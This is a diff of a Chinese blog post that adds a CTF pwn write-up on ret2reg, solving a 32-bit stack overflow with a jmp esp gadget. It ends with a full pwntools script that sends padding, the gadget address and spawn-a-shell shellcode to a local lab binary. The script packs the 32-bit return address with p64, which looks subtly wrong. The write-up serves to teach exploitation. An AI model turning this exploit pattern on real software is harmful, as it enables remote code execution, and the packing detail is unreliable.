@@ -2,7 +2,7 @@
 title: Pwn-ret2reg
 description: pwn第9部分学习Pwn-ret2reg
 date: 2026-07-16 12:24:49
-updated: 2026-07-16 12:24:49
+updated: 2026-07-20 16:52:00
 image: https://images.cnblogs.com/cnblogs_com/blogs/860797/galleries/2492655/o_260716043407_Image_1782995576826_26.jpg
 categories: [pwn]
 tags: [栈溢出, ret2reg]
@@ -262,5 +262,111 @@ call eax 思路：
 - ret2reg 本质是 "找一条能让 rip = 某个寄存器数值的 gadget"
 - 实战中直接的 `jmp esp` 很少见，更多是 `push esp; ...; ret` 这种"绕路"gadget
 - 32 位下找 ret2reg gadget 用 `ROPgadget | grep "push esp"` / `"jmp esp"` / `"call esp"`
+
+---
+
+## ret2reg_v2
+
+::alert{icon="tabler:files" color="var(--c-accent)" title="题目地址"}
+
+[点击跳转题目下载](https://gitee.com/ASUS_HACKED/cybersecurity/tree/比赛附件/HACKED笔记pwn/题目)
+
+::
+
+---
+
+### 0x01 题目分析
+
+![image-20260720144908146](https://img2024.cnblogs.com/blog/3726946/202607/3726946-20260720165218969-2109398473.png)
+
+---
+
+### 0x02 函数分析
+
+#### main()
+
+![image-20260720144931710](https://img2024.cnblogs.com/blog/3726946/202607/3726946-20260720165218567-929325016.png)
+
+#### read_input()
+
+![image-20260720144938522](https://img2024.cnblogs.com/blog/3726946/202607/3726946-20260720165218207-1052395770.png)
+
+发现一个栈溢出漏洞，read读取信息到s数组中,不过我们没有发现syscall和/bin/sh的地址，所以就需要我们找到一个跳转地址执行函数了，什么你想使用ret2shellcode技能？那你看看有没有合适的空间大小呢？shellcraft.sh生成的大小是 44 字节，自己写最小的asm的需要27字节。可是我们可用的空间并没有多少
+
+![image-20260720160411091](https://img2024.cnblogs.com/blog/3726946/202607/3726946-20260720165217821-343384985.png)
+
+ceret2syscall呢？
+
+pop链子太少，不足以泄
+
+ret2syslibc需要合适的puts或者read去泄露版本信息才能拿到libc的匹配地址
+
+![image-20260720161611534](https://img2024.cnblogs.com/blog/3726946/202607/3726946-20260720165217338-1574364352.png)
+
+
+
+那我们就正常的写ret2reg链子吧
+
+---
+
+### 0x03 payload条件收集
+
+ret2reg的核心就是去寻找jmp 或者call这类关键的ROP（也可以是上一题的pop esp）,不过核心是先确认ret时刻的时候哪个寄存器存储的是栈的地址,如果没有的话才需要找jmp esp之类
+
+运行pwndbg看看运行
+
+![image-20260720162838076](https://img2024.cnblogs.com/blog/3726946/202607/3726946-20260720165216879-1380669252.png)
+
+断点在read_input
+
+![image-20260720163045346](https://img2024.cnblogs.com/blog/3726946/202607/3726946-20260720165216323-1411640841.png)
+
+可以很直观的发现当read_input运行到ret的时候，寄存器的数据没有一个是指向有用的stack空间，那我们就去找找jmp类
+
+```shell
+ROPgadget --binary ret2reg_v2 --only "jmp"
+```
+
+
+
+![image-20260720163211724](https://img2024.cnblogs.com/blog/3726946/202607/3726946-20260720165215580-665100892.png)
+
+IDA验证
+
+![image-20260720163256344](https://img2024.cnblogs.com/blog/3726946/202607/3726946-20260720165214871-582795159.png)
+
+那么我们的构造链子就很容易了
+
+```python
+payload  = b'a'*offset
+payload += p64(jmp_esp) #ret addr
+payload += shellcode
+```
+
+
+
+----
+
+### 0x04 payload完整
+
+```python
+from pwn import *
+context(os = 'linux',arch = 'i386')
+
+r = process('./ret2reg_v2')
+
+offset    = 0x4c + 0x4
+jmp_esp   = 0x080491b6
+shellcode = asm(shellcraft.sh())
+
+payload  = b'a'*offset
+payload += p64(jmp_esp) #ret addr
+payload += shellcode
+
+r.recvuntil(b'Input: ')
+r.send(payload)
+
+r.interactive()
+```
 
 ---
